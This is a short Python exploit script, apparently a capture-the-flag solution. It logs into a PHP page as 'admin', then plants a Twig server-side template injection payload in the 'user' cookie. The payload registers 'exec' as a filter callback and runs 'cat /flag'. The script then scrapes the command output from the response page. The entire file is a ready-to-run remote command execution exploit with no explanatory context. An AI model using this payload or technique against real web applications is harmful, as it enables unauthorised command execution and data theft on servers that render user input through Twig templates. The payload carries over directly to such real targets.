import urllib.parse
from sys import argv

import requests

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print('python3 exp.py url')
    else:
        from requests import (session, get)

        s = requests.session()
        url = url + "flag.php"

        headers = {
            "User-Agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/109.0.0.0 Safari/537.36'}

        username = {
            "username": "admin",
            "submit": "submit",
        }

        login = s.post(url=url, headers=headers, data=username, allow_redirects=False)

        payload = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}'
        login.cookies.set("user", payload)
        s.cookies.update(login.cookies)

        flag_php = s.get(url, headers=headers, allow_redirects=False)

        from lxml import etree

        dom = etree.HTML(flag_php.text)
        flag = "".join(dom.xpath("//div/label/h2/text()"))
        print(flag[6:])

